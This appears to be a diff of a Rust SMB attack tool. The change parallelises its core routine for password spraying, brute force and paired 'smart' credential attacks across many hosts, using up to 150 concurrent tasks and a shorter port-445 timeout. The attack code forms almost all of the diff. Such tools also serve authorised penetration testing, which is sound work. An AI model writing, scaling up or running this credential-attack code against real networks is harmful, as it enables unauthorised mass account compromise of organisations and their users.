@@ -1,3 +1,4 @@
+use std::sync::Arc;
 use crate::args::Args;
 
 use smb::{Client, ClientConfig, UncPath};
@@ -5,6 +6,7 @@ use std::str::FromStr;
 use std::net::SocketAddr;
 use tokio::net::TcpStream;
 use tokio::time::{Duration, timeout};
+use tokio::sync::Semaphore;
 use colored::Colorize;
 
 // CHECK IF HASH OR NOT
@@ -57,7 +59,7 @@ pub async fn check_open(ip: &str, port: u16) -> bool {
     };
 
     let stream = TcpStream::connect(&server);
-    match timeout(Duration::from_secs(2), stream).await {
+    match timeout(Duration::from_millis(500), stream).await {
         Ok(Ok(_s)) => true,
         _ => false,
     }
@@ -90,7 +92,10 @@ pub async fn execute_auth(ip: &str, username: &str, password: &str, args: &Args,
 }
 
 // CORE ATTACK DISPATCHING BRUTEFORCE / SPRAYING / SMART / CONNECT SHARE / LIST SHARE
-pub async fn attack(users: &Vec<String>, passwords: &Vec<String>, targets: &Vec<String>, some_args: &Args) {
+pub async fn attack(users: Arc<Vec<String>>, passwords: Arc<Vec<String>>, targets: Arc<Vec<String>>, some_args: Arc<Args>) {
+    let semaphore = Arc::new(Semaphore::new(150));
+    let mut tickets = vec![];
+
     let is_spraying = users.len() > 1 && passwords.len() == 1;
     let is_bruteforce = users.len() == 1 && passwords.len() > 1;
     let is_smart = some_args.smart;
@@ -99,23 +104,39 @@ pub async fn attack(users: &Vec<String>, passwords: &Vec<String>, targets: &Vec<
     else if is_bruteforce { println!("[i] Starting bruteforce attack with {} passwords", passwords.len()); }
     else if is_smart {println!("[i] Starting smart attack with {} combos", users.len())}
         
-    for ip in targets {
-        if check_open(&ip, 445).await {
-            println!("[+] [{}]", ip);
+    for ip in targets.iter() {
+        let u = Arc::clone(&users);
+        let p = Arc::clone(&passwords);
+        let a = Arc::clone(&some_args);
+        let ip_addr = ip.clone();
+        let sem = Arc::clone(&semaphore);
+
+        let ticket = tokio::spawn(async move {
+            let _permit = sem.acquire().await.unwrap();
+
+            if check_open(&ip_addr, 445).await {
+                println!("[+] [{}]", ip_addr);
             
-            if is_smart {
-                for (username, password) in users.iter().zip(passwords.iter()) {
-                    execute_auth(&ip, username, password, some_args, &is_bruteforce).await;
-                }
-            } else {
-                for username in users {
-                    for password in passwords {
-                        execute_auth(&ip, username, password, some_args, &is_bruteforce).await;
+                if is_smart {
+                    for (username, password) in u.iter().zip(p.iter()) {
+                        execute_auth(&ip_addr, username, password, &a, &is_bruteforce).await;
+                    }
+                } else {
+                    for username in u.iter() {
+                       for password in p.iter() {
+                            execute_auth(&ip_addr, username, password, &a, &is_bruteforce).await;
+                       }
                     }
                 }
+            } else {
+                return;
             }
-        } else {
-            continue;
-        }
+        });
+
+        tickets.push(ticket);
+
+    }
+    for t in tickets {
+        let _ = t.await;
     }
 }
